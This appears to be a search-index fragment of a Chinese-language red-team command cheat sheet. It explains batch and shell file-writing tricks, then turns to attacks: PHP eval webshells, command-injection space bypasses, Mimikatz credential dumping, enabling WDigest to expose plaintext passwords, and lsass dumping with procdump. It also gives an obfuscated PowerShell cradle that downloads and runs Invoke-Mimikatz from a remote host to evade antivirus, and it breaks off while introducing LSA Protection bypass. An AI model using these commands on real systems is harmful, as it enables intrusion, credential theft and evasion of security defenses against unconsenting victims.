\u662f\u4e00\u4e2a\u5b50 shell \u547d\u4ee4\uff0c\u5b83\u4f1a\u6267\u884c whoami \u547d\u4ee4\u6765\u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\u3002<code>$(dirname $f)</code>\u4f1a\u63d0\u53d6\u53d8\u91cf $f \u6240\u4ee3\u8868\u6587\u4ef6\u7684\u76ee\u5f55\u8def\u5f84\u3002\u7136\u540e\uff0c&gt; \u64cd\u4f5c\u7b26\u5c06 whoami \u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u76ee\u5f55\u8def\u5f84\u4e0b\u7684 test.txt \u6587\u4ef6\u4e2d\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\u5219\u4f1a\u521b\u5efa\uff0c\u5982\u679c\u5df2\u5b58\u5728\u5219\u4f1a\u8986\u76d6\u5185\u5bb9\u3002</p> <p>\u7efc\u4e0a\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5728\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u4e2d\u641c\u7d22\u5305\u542b \"index.js\" \u5b57\u7b26\u4e32\u7684\u6587\u4ef6\uff0c\u7136\u540e\u5bf9\u6bcf\u4e00\u4e2a\u627e\u5230\u7684\u6587\u4ef6\u6267\u884c whoami \u547d\u4ee4\uff0c\u5c06\u8f93\u51fa\u5199\u5165\u5230\u8be5\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u7684 test.txt \u6587\u4ef6\u4e2d\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#windows","title":"Windows(\u6ce8\u610f\u76d8\u7b26)","text":"<pre><code>for /r D:\\ %i in (index.js*) do whoami &gt; %i/../test.txt\n</code></pre> <p>\u4f5c\u7528\u662f\u5728\u6307\u5b9a\u76ee\u5f55\uff08D:\\\uff09\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u641c\u7d22\u6240\u6709\u4ee5 \"index.js\" \u5f00\u5934\u7684\u6587\u4ef6\uff0c\u5e76\u5c06\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\u5199\u5165\u5230\u6bcf\u4e2a\u5339\u914d\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u7684 test.txt \u6587\u4ef6\u4e2d\u3002</p> <p><code>for /r D:\\ %i in (index.js*)</code>: \u8fd9\u90e8\u5206\u547d\u4ee4\u4f7f\u7528 for \u5faa\u73af\u6765\u904d\u5386\u6307\u5b9a\u76ee\u5f55\uff08D:\\\uff09\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u3002/r \u8868\u793a\u9012\u5f52\u641c\u7d22\u3002%i \u662f\u5faa\u73af\u53d8\u91cf\uff0c\u7528\u4e8e\u5b58\u50a8\u5f53\u524d\u6587\u4ef6\u7684\u8def\u5f84\u3002(index.js) \u662f\u6587\u4ef6\u540d\u7684\u6a21\u5f0f\uff0c\u5b83\u4f1a\u5339\u914d\u4ee5 \"index.js\" \u5f00\u5934\u7684\u4efb\u4f55\u6587\u4ef6\u540d\uff0c \u8868\u793a\u4efb\u610f\u540e\u7f00\u3002</p> <p><code>do whoami &gt; %i/../test.txt</code>: \u8fd9\u90e8\u5206\u662f\u5728\u5faa\u73af\u4e2d\u6267\u884c\u7684\u64cd\u4f5c\u3002whoami \u547d\u4ee4\u7528\u4e8e\u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\u3002&gt; \u662f\u91cd\u5b9a\u5411\u64cd\u4f5c\u7b26\uff0c\u5c06 whoami \u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6307\u5b9a\u6587\u4ef6\u3002%i \u662f\u5f53\u524d\u6587\u4ef6\u7684\u8def\u5f84\uff0c%i/../test.txt \u8868\u793a\u5c06 test.txt \u6587\u4ef6\u521b\u5efa\u5728\u5f53\u524d\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\u3002</p> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5728\u6307\u5b9a\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u641c\u7d22\u4ee5 \"index.js\" \u5f00\u5934\u7684\u6587\u4ef6\uff0c\u5e76\u5728\u6bcf\u4e2a\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u5199\u5165\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#shell","title":"\u5199shell","text":"<p>\u5728Windows\u4e2d\uff0c\u6279\u5904\u7406\u9700\u8981\u8f6c\u4e49\u5b57\u7b26\u4e3b\u8981\u6709\"&amp;\",\"|\",\"&lt;\",\"&gt;\"\u7b49\u7b49\uff0c\u8f6c\u4e49\u5b57\u7b26\u4e3a\"^\"</p> <p>\u5728Linux\u4e2d\uff0c\u9700\u8981\u8f6c\u4e49\u5b57\u7b26\u4e3b\u8981\u662f\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7 \u5bf9\u4e8e\u5355\u5f15\u53f7\uff0c\u6211\u4eec\u5c06\u5176\u66ff\u6362\u6210\u4e3a<code>\\47</code>\u5373\u53ef\uff0c\u800c\u5bf9\u4e8e\u53cc\u5f15\u53f7\uff0c\u5219\u4f7f\u7528\\22\u8fdb\u884c\u8f6c\u4e49\u3002</p> <p>windows\u547d\u4ee4\u884c\u6700\u5927\u957f\u5ea6\u4e3a8191,16\u8fdb\u5236\u662f113898\u3002echo\u5199\u6587\u4ef6\u65f6\u6ce8\u610f\u957f\u5ea6\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_2","title":"\u65b9\u6cd5\u4e00","text":"<pre><code>set /p=qaxnb&lt;nul&gt;d:\\1d13.txt\n</code></pre> <p>\u8fd9\u4e2a\u547d\u4ee4\u662f\u4e00\u4e2a Windows \u6279\u5904\u7406\u547d\u4ee4\uff0c\u5b83\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <p><code>set /p=qaxnb&lt;nul&gt;</code>\uff1a\u8fd9\u4e2a\u90e8\u5206\u6709\u4e24\u4e2a\u4e3b\u8981\u4f5c\u7528\u3002\u9996\u5148\uff0cset /p \u547d\u4ee4\u7528\u4e8e\u4ece\u7528\u6237\u8f93\u5165\u4e2d\u83b7\u53d6\u4e00\u4e2a\u503c\u5e76\u5c06\u5176\u8d4b\u7ed9\u53d8\u91cf\u3002\u5728\u8fd9\u91cc\uff0c/p \u8868\u793a\u201cprompt\u201d\u7684\u610f\u601d\uff0c\u8868\u793a\u7b49\u5f85\u7528\u6237\u8f93\u5165\u3002\u4f46\u662f\uff0c\u5728 &lt;nul \u4e4b\u524d\u7684 qaxnb \u5e76\u4e0d\u662f\u63d0\u793a\u4fe1\u606f\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u5c06 qaxnb \u8fd9\u4e2a\u503c\u8d4b\u7ed9\u53d8\u91cf %qaxnb%\u3002&lt;nul \u7684\u4f5c\u7528\u662f\u5c06\u8f93\u5165\u91cd\u5b9a\u5411\u5230\u7a7a\u8bbe\u5907\uff08nul\uff09\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u7528\u6237\u624b\u52a8\u8f93\u5165\u4efb\u4f55\u5185\u5bb9\uff0c\u800c\u662f\u4ece\u7a7a\u8bbe\u5907\u8bfb\u53d6\u3002</p> <p><code>d:\\1d13.txt</code>\uff1a\u8fd9\u90e8\u5206\u8868\u793a\u5c06\u53d8\u91cf %qaxnb% \u7684\u503c\u5199\u5165\u5230\u6587\u4ef6 d:\\1d13.txt \u4e2d\u3002</p> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5c06\u5b57\u7b26\u4e32 \"qaxnb\" \u5199\u5165\u5230\u6587\u4ef6 d:\\1d13.txt \u4e2d\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_3","title":"\u65b9\u6cd5\u4e8c","text":"<pre><code>echo qaxnb&gt;1we.txt\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_4","title":"\u8ffd\u52a0\u5185\u5bb9","text":"<pre><code>echo qaxcnm&gt;&gt;1we.txt\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_5","title":"\u4e0d\u6362\u884c\u8ffd\u52a0\u5185\u5bb9","text":"<pre><code>set /p=\"123123\"&gt;&gt;1we.txt\n</code></pre> <p><code>set /p=\"123123\"</code>\uff1a\u8fd9\u4e2a\u90e8\u5206\u5c06\u5b57\u7b26\u4e32 \"123123\" \u5b58\u50a8\u5230\u4e00\u4e2a\u65e0\u540d\u7684\u53d8\u91cf\u4e2d\u3002</p> <p><code>&gt;&gt;1we.txt</code>\uff1a\u8fd9\u90e8\u5206\u5c06\u524d\u9762\u7684\u5b57\u7b26\u4e32\u8ffd\u52a0\u5230\u6587\u4ef6 \"1we.txt\" \u4e2d\u3002&gt;&gt; \u662f\u8ffd\u52a0\u91cd\u5b9a\u5411\u64cd\u4f5c\u7b26\uff0c\u5b83\u4f1a\u5728\u6587\u4ef6\u7684\u672b\u5c3e\u6dfb\u52a0\u5185\u5bb9\u800c\u4e0d\u8986\u76d6\u539f\u6709\u7684\u5185\u5bb9\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_6","title":"\u89c4\u907f\u7a7a\u683c","text":"<p>\u5982\u679c\u65e0\u6cd5\u8f93\u5165\u7a7a\u683c.</p> <pre><code>echo.123&gt;&gt;a.txt\necho,123&gt;&gt;a.txt\ntype;a.txt\n</code></pre> <p></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#certutil","title":"\u5199\u7279\u6b8a\u5b57\u7b26\u5f88\u591a\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528certutil\u7f16\u7801\u518d\u8fd8\u539f","text":"<p>\u5982\u4e0b\u8fd8\u539f\uff1a</p> <pre><code>certutil -f -decode 111.txt C:\\\\111.jsp\ncertutil -decodehex 111.txt C:\\\\111.jsp\n</code></pre> <p></p> <p><code>certutil -f -decode 111.txt C:\\\\111.jsp</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5bf9\u540d\u4e3a \"111.txt\" \u7684\u6587\u4ef6\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u5c06\u89e3\u7801\u540e\u7684\u5185\u5bb9\u4fdd\u5b58\u5230\u540d\u4e3a \"C:\\111.jsp\" \u7684\u6587\u4ef6\u4e2d\u3002-f \u6807\u5fd7\u8868\u793a\u5f3a\u5236\u8986\u76d6\u76ee\u6807\u6587\u4ef6\uff08\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff09\u3002\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5c06 \"111.txt\" \u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u4fdd\u5b58\u5230 \"C:\\111.jsp\" \u6587\u4ef6\u4e2d\u3002</p> <p><code>certutil -decodehex 111.txt C:\\\\111.jsp</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4e5f\u662f\u5bf9\u540d\u4e3a \"111.txt\" \u7684\u6587\u4ef6\u8fdb\u884c\u89e3\u7801\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u5b83\u4f7f\u7528\u4e86 -decodehex \u53c2\u6570\uff0c\u8fd9\u8868\u793a\u8981\u6c42\u89e3\u7801\u5668\u5c06\u8f93\u5165\u6587\u4ef6\u89c6\u4e3a\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8fdb\u884c\u89e3\u7801\u3002\u7136\u540e\uff0c\u89e3\u7801\u540e\u7684\u5185\u5bb9\u4f1a\u88ab\u4fdd\u5b58\u5230 \"C:\\111.jsp\" \u6587\u4ef6\u4e2d\u3002</p> <p>\u8fd9\u4e24\u4e2a\u547d\u4ee4\u7684\u533a\u522b\u5728\u4e8e\u89e3\u7801\u5668\u5bf9\u5f85\u8f93\u5165\u6587\u4ef6\u7684\u65b9\u5f0f\uff1a\u7b2c\u4e00\u4e2a\u547d\u4ee4\u9ed8\u8ba4\u5c06\u8f93\u5165\u6587\u4ef6\u89c6\u4e3a Base64 \u7f16\u7801\u7684\u6587\u672c\u6587\u4ef6\u8fdb\u884c\u89e3\u7801\uff0c\u800c\u7b2c\u4e8c\u4e2a\u547d\u4ee4\u5c06\u8f93\u5165\u6587\u4ef6\u89c6\u4e3a\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#linuxbase64","title":"linux\u4e0bbase64","text":"<pre><code>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#php","title":"php\u7684","text":"<pre><code>echo \\&lt;\\?php eval\\(\\@\\$_POST\\[1\\]\\)\\; \\?\\&gt; &gt;1.php\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_7","title":"\u7ed5\u8fc7\u7a7a\u683c","text":"<pre><code>&gt; &lt; &lt;&gt; \u91cd\u5b9a\u5411\u7b26\n%09(\u9700\u8981php\u73af\u5883)\n${IFS}\n$IFS$9\n{cat,flag.php}\n%20\n%09\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#windows_1","title":"windows\u6253\u5305\u76ee\u5f55","text":"<pre><code>powershell -Command \"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\"\n</code></pre> <p><code>powershell</code>\uff1a\u8fd9\u662f\u547d\u4ee4\u884c\u4e2d\u542f\u52a8 PowerShell \u7684\u5173\u952e\u8bcd\u3002</p> <p><code>-Command</code>\uff1a\u8fd9\u4e2a\u6807\u5fd7\u544a\u8bc9 PowerShell \u89e3\u91ca\u5668\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u8981\u6267\u884c\u7684 PowerShell \u547d\u4ee4\u3002</p> <p><code>\"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\"</code>\uff1a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u8981\u6267\u884c\u7684 PowerShell \u547d\u4ee4\u3002\u5b83\u8c03\u7528\u4e86 Compress-Archive cmdlet\uff0c\u5e76\u4f20\u9012\u4e86\u4e24\u4e2a\u53c2\u6570\uff1a</p> <ul> <li> <p><code>-Path E:\\update\\</code>\uff1a\u8fd9\u662f\u8981\u538b\u7f29\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u8def\u5f84\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u8def\u5f84\u662f E \u76d8\u4e0b\u7684 update \u6587\u4ef6\u5939\u3002</p> </li> <li> <p><code>-DestinationPath E:\\test.zip</code>\uff1a\u8fd9\u662f\u538b\u7f29\u540e\u7684\u5f52\u6863\u6587\u4ef6\u7684\u4fdd\u5b58\u8def\u5f84\u548c\u6587\u4ef6\u540d\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5f52\u6863\u6587\u4ef6\u5c06\u4fdd\u5b58\u5728 E \u76d8\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u5e76\u547d\u540d\u4e3a test.zip\u3002</p> </li> </ul> <p>\u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5c06 E \u76d8\u4e0b\u7684 update \u6587\u4ef6\u5939\u4e2d\u7684\u5185\u5bb9\u538b\u7f29\u6210\u4e00\u4e2a\u540d\u4e3a test.zip \u7684 Zip \u5f52\u6863\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c06\u4fdd\u5b58\u5728 E \u76d8\u7684\u6839\u76ee\u5f55\u4e0b\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#mimikatz","title":"Mimikatz","text":"<p>mimikatz\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u63d0\u53d6\u660e\u6587\u5bc6\u7801\u3001\u54c8\u5e0c\u3001PIN \u7801\u548c kerberos \u7968\u8bc1\u3002 mimikatz \u8fd8\u53ef\u4ee5\u6267\u884c\u54c8\u5e0c\u4f20\u9012\u3001\u7968\u8bc1\u4f20\u9012\u6216\u6784\u5efa\u9ec4\u91d1\u7968\u8bc1\u3002 https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_8","title":"\u4e00\u6761\u547d\u4ee4","text":"<pre><code>.\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> <p>\u63d0\u5347\u6743\u9650 <code>privilege::debug</code> : \u901a\u8fc7debug\u83b7\u5f97mimikatz\u7a0b\u5e8f\u7684\u7279\u6b8a\u64cd\u4f5c,\u8c03\u8bd5\u6743\u9650\u5141\u8bb8\u67d0\u4eba\u8c03\u8bd5\u4ed6\u4eec\u672c\u6765\u65e0\u6cd5\u8bbf\u95ee\u7684\u8fdb\u7a0b\u3002\u4f8b\u5982\uff0c\u4f5c\u4e3a\u7528\u6237\u8fd0\u884c\u7684\u8fdb\u7a0b\u5728\u5176\u4ee4\u724c\u4e0a\u542f\u7528\u4e86\u8c03\u8bd5\u6743\u9650\uff0c\u53ef\u4ee5\u8c03\u8bd5\u4f5c\u4e3a\u672c\u5730\u7cfb\u7edf\u8fd0\u884c\u7684\u670d\u52a1\u3002</p> <p>\u6293\u53d6\u660e\u6587\u5bc6\u7801 <code>sekurlsa::logonpasswords</code>: \u5728windows2012\u4ee5\u4e0a\u7684\u7cfb\u7edf\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6\u660e\u6587\u5bc6\u7801\u4e86\uff0c\u9700\u8981\u914d\u7f6e\u76f8\u5173\u6ce8\u518c\u8868\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#log","title":"\u63a7\u5236\u53f0\u6267\u884c\u591a\u6761\u547d\u4ee4\uff0c\u7528log\u9632\u6b62\u8fdb\u7a0b\u5d29\u6e83\uff0c\u6570\u636e\u4e22\u5931","text":"<pre><code>mimikatz # privilege::debug\nmimikatz # log\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest\n</code></pre> <p>tspkg\uff0cwdigest\uff0ckerberos\uff1a\u8fd9\u4e2a\u5c31\u662f\u8d26\u6237\u5bf9\u5e94\u7684\u660e\u6587\u5bc6\u7801\u4e86\u3002\u6709\u7684\u65f6\u5019\u8fd9\u4e09\u4e2a\u5bf9\u5e94\u7684\u4e5f\u4e0d\u662f\u5168\u90e8\u90fd\u662f\u4e00\u6837\u7684\uff0c\u9700\u8981\u770b\u670d\u52a1\u5668\u662f\u4ec0\u4e48\u89d2\u8272\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#msf","title":"msf\u4e2d\u6267\u884c\u547d\u4ee4","text":"<pre><code>mimikatz_command -f sekurlsa::logonPasswords full\nmimikatz_command -f sekurlsa::wdigest\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#wdigest08r22016","title":"\u6ce8\u518c\u8868\u5f00\u542fwdigest,08r2\u540e\u9ed8\u8ba4\u5173\u95ed\u3002\u9700\u8981\u76ee\u6807\u6ce8\u9500\uff0c\u91cd\u65b0\u767b\u5f55\u30022016\u9700\u8981\u91cd\u542f\u3002","text":"<pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t\nREG_DWORD /f /d 1\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#mimikatz_1","title":"\u7ed5\u8fc7\u6740\u8f6f\u6267\u884cmimikatz","text":""},{"location":"CTF/Red_Team_Commands/Article1/index.html#powershell","title":"powershell","text":"<p><code>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</code></p> <p>cmd\u4e0b\u6267\u884c</p> <pre><code>C:\\Users\\test\\Desktop&gt;powershell -exec bypass \"import-module .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz\"\n</code></pre> <p>\u8fd9\u4e2a\u547d\u4ee4\u542f\u52a8 PowerShell\uff0c\u7136\u540e\u901a\u8fc7 -exec bypass \u53c2\u6570\u7ed5\u8fc7\u4e86 PowerShell \u7684\u6267\u884c\u7b56\u7565\uff08Execution Policy\uff09\uff0c\u5141\u8bb8\u6267\u884c\u672a\u7b7e\u540d\u7684\u811a\u672c\u3002\u7136\u540e\uff0c\u547d\u4ee4\u6267\u884c\u4e86\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <p><code>import-module .\\Invoke-Mimikatz.ps1</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5bfc\u5165\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u540d\u4e3a \"Invoke-Mimikatz.ps1\" \u7684 PowerShell \u811a\u672c\u6587\u4ef6\u3002\u8fd9\u4e2a\u811a\u672c\u901a\u5e38\u7528\u4e8e\u6267\u884c Mimikatz \u5de5\u5177\u4e2d\u7684\u529f\u80fd\uff0cMimikatz \u662f\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u6293\u53d6\u5de5\u5177\uff0c\u5e38\u7528\u4e8e\u6e17\u900f\u6d4b\u8bd5\u548c\u5b89\u5168\u8bc4\u4f30\u3002</p> <p><code>Invoke-Mimikatz</code>\uff1a\u4e00\u65e6 \"Invoke-Mimikatz.ps1\" \u88ab\u5bfc\u5165\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u6267\u884c\u8be5\u811a\u672c\u4e2d\u7684 Invoke-Mimikatz \u51fd\u6570\u6216\u547d\u4ee4\u3002\u8fd9\u901a\u5e38\u4f1a\u89e6\u53d1 Mimikatz \u5de5\u5177\u7684\u6267\u884c\uff0c\u4ece\u800c\u6267\u884c\u76f8\u5173\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u63d0\u53d6\u7cfb\u7edf\u4e2d\u7684\u51ed\u636e\u4fe1\u606f\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u65e8\u5728\u6267\u884c\u4e00\u4e2a PowerShell \u811a\u672c\uff08Invoke-Mimikatz.ps1\uff09\uff0c\u4ee5\u6267\u884c Mimikatz \u5de5\u5177\u4e2d\u7684\u76f8\u5173\u529f\u80fd\u3002</p> <p>\u4e5f\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d</p> <pre><code>powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-Mimikatz.ps1');Invoke-Mimikatz\n</code></pre> <p><code>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-Mimikatz.ps1');</code>\uff1a\u8fd9\u4e2a\u90e8\u5206\u5229\u7528 PowerShell \u7684 IEX \uff08Invoke-Expression\uff09\u547d\u4ee4\uff0c\u6267\u884c\u4e86\u4ece\u6307\u5b9a URL \u4e0b\u8f7d\u7684 PowerShell \u811a\u672c\u3002\u5177\u4f53\u6765\u8bf4\uff1a</p> <p><code>(New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-Mimikatz.ps1')</code> \u8fd9\u90e8\u5206\u4f7f\u7528 Net.WebClient \u5bf9\u8c61\u4e0b\u8f7d\u4e86\u4f4d\u4e8e\u6307\u5b9a URL \u7684 PowerShell \u811a\u672c\u7684\u5185\u5bb9\u3002 IEX \u547d\u4ee4\u5c06\u4e0b\u8f7d\u7684\u811a\u672c\u5185\u5bb9\u4f5c\u4e3a\u5b57\u7b26\u4e32\u6267\u884c\uff0c\u76f8\u5f53\u4e8e\u5728\u5f53\u524d PowerShell \u4f1a\u8bdd\u4e2d\u76f4\u63a5\u6267\u884c\u4e86\u4ece\u7f51\u7edc\u4e0b\u8f7d\u7684\u811a\u672c\u5185\u5bb9\u3002 Invoke-Mimikatz\uff1a\u4e00\u65e6\u8fdc\u7a0b\u811a\u672c\u88ab\u4e0b\u8f7d\u5e76\u6267\u884c\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8c03\u7528\u811a\u672c\u4e2d\u7684 Invoke-Mimikatz \u51fd\u6570\u6216\u547d\u4ee4\u3002\u8fd9\u901a\u5e38\u4f1a\u89e6\u53d1 Mimikatz \u5de5\u5177\u7684\u6267\u884c\uff0c\u4ece\u800c\u6267\u884c\u76f8\u5173\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u63d0\u53d6\u7cfb\u7edf\u4e2d\u7684\u51ed\u636e\u4fe1\u606f\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u65e8\u5728\u901a\u8fc7\u8fdc\u7a0b\u4e0b\u8f7d\u7684\u65b9\u5f0f\u6267\u884c\u4e00\u4e2a PowerShell \u811a\u672c\uff08Invoke-Mimikatz.ps1\uff09\uff0c\u4ee5\u6267\u884c Mimikatz \u5de5\u5177\u4e2d\u7684\u76f8\u5173\u529f\u80fd\u3002</p> <p>\u4f46\u662fpowershell\u88ab360\u62e6\u622a</p> <p></p> <p>\u7b80\u5355\u6df7\u6dc6\u5c31bypass\u4e86</p> <pre><code>powershell -c \" ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.0'+'.101/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX\"\n</code></pre>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#lsass","title":"\u5bfc\u51falsass\u8fdb\u7a0b\u79bb\u7ebf\u8bfb\u5bc6\u7801","text":"<p>1.\u5b89\u88c5procdump64.exe</p> <p><code>https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</code></p> <p>2.\u4eceprocdump64.exe\u91cc\u5bfc\u51fa1.dmp</p> <pre><code>procdump64.exe -accepteula -ma lsass.exe 1.dmp\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5728\u4efb\u52a1\u7ba1\u7406\u5668\u4e2d\u64cd\u4f5c</p> <p></p> <p>3.\u7136\u540e\u5c061.dmp\u4e0b\u8f7d\u5230\u672c\u5730</p> <pre><code>mimikatz_2.1_64.exe \"sekurlsa::minidump 1.dmp\" \"sekurlsa::logonPasswords full\" exit\n</code></pre> <p></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#bypass-lsa-protection","title":"Bypass LSA Protection","text":"<p>\u5728\u6e17\u900f\u8fc7\u7a0b\u4e2d\uff0c\u83b7\u5f97\u4e00\u53f0windows\u673a\u5668\u6743\u9650\u4e4b\u540e\uff0c\u5f88\u91cd\u8981\u4e00\u4e2a\u73af\u8282\u5c31\u662f\u6293\u5bc6\u7801\u3002 \u4f46\u662f\u5728\u4f7f\u7528mimikatz\u6293\u53d6\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u65f6\uff0c\u6709\u65f6\u8fd0\u7ef4\u4eba\u5458\u4f1a\u5f00\u542f\u4e00\u4e9b\u9632\u62a4\u63aa\u65bd\uff0c\u5bfc\u81f4mimikatz\u6293\u53d6\u5931\u8d25\u6216\u5f02\u5e38\u3002 \u4e0b\u9762\u4e3b\u8981\u4ecb\u7ecdbypass LSA Protection\u83b7\u53d6\u5bc6\u7801\u3002</p> <p>LSA\uff08Local Security Authority\uff09\u4fdd\u62a4\u662f\u4e00\u9879Windows\u5b89\u5168\u529f\u80fd\uff0c\u65e8\u5728\u63d0\u9ad8\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u7279\u522b\u662f\u9488\u5bf9LSASS\uff08Local Security Authority Subsystem Service\uff09\u8fdb\u7a0b\u7684\u4fdd\u62a4\u3002</p> <p>LSASS \u662f\u8d1f\u8d23\u9a8c\u8bc1\u7528\u6237\u767b\u5f55\u4fe1\u606f\u3001\u5206\u914d\u5b89\u5168\u4ee4\u724c\u4ee5\u53ca\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743\u64cd\u4f5c\u7684\u5173\u952e\u7cfb\u7edf\u8fdb\u7a0b\u3002\u7531\u4e8e\u5176\u5173\u952e\u6027\uff0cLSASS \u6210\u4e3a\u4e86\u9ed1\u5ba2\u653b\u51fb\u7684\u76ee\u6807\u4e4b\u4e00\u3002\u653b\u51fb\u8005\u53ef\u80fd\u5c1d\u8bd5\u901a\u8fc7\u5404\u79cd\u624b\u6bb5\u83b7\u53d6 LSASS \u8fdb\u7a0b\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4ee5\u6267\u884c\u6076\u610f\u6d3b\u52a8\uff0c\u4f8b\u5982\u83b7\u53d6\u7528\u6237\u51ed\u636e\u6216\u6267\u884c\u63d0\u6743\u653b\u51fb\u3002</p> <p>\u4e3a\u4e86\u589e\u5f3a\u5bf9 LSASS \u8fdb\u7a0b\u7684\u4fdd\u62a4\uff0cWindows 